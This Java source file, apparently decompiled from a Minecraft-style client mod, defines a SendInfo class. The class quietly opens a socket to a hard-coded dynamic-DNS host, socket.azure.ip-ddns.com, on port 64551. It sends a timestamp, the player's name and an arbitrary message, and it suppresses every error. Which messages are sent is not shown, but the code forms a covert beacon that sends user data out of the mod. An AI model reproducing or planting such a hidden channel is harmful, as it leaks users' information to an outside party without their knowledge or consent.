package dev.luminous.mod.modules.impl.client.network;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public class SendInfo {
    public static void sendInfo(String msg) {
        String serverAddress = "socket.azure.ip-ddns.com";
        int serverPort = 64551;
        if (!msg.isEmpty()) {
            try {
                msg = dev.luminous.mod.modules.impl.client.network.Time.getTime() + " " + "[" + dev.luminous.mod.modules.impl.client.network.Player.getPlayerName() + "] " + msg;


                Socket socket = new Socket(serverAddress, serverPort);
                OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream(), "UTF-8");
                InetAddress clientAddress = socket.getInetAddress();
                PrintWriter writer = new PrintWriter(osw);
                String ip = clientAddress.getHostAddress();
                writer.println(msg);
                writer.flush();
                writer.close();
                osw.close();
                socket.close();
            } catch (IOException iOException) {
                // empty catch block
            }
        }
    }
}
